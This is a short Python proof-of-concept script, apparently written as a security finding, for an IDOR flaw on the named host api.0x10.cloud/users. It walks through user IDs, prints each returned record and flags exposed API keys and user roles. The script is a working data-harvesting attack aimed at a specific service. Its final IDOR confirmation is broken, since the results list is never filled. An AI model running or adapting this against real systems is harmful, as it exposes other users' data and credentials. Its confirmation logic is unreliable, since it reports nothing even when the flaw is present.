"""
Author: Kiana Sepasian
Vulnerability: IDOR with API Key Exposure
Target: api.0x10.cloud/users
"""

import urllib.request

base_url = "https://api.0x10.cloud/users?id="

ids = ["1", "2", "3", "4"]

results = []

for user_id in ids:
    try:
        url = base_url + user_id
        response = urllib.request.urlopen(url, timeout=5)
        data = response.read().decode(errors="ignore")

        print("\n======================")
        print("Testing ID:", user_id)
        print(data)

        if "api_key" in data:
            print("CRITICAL: API key exposed!")

        if "role" in data:
            print("User role exposed!")


    except Exception as e:
        print("Error:", e)

if len(set(results)) > 1:
    print("\nCONFIRMED: Different user data returned for different IDs (IDOR)")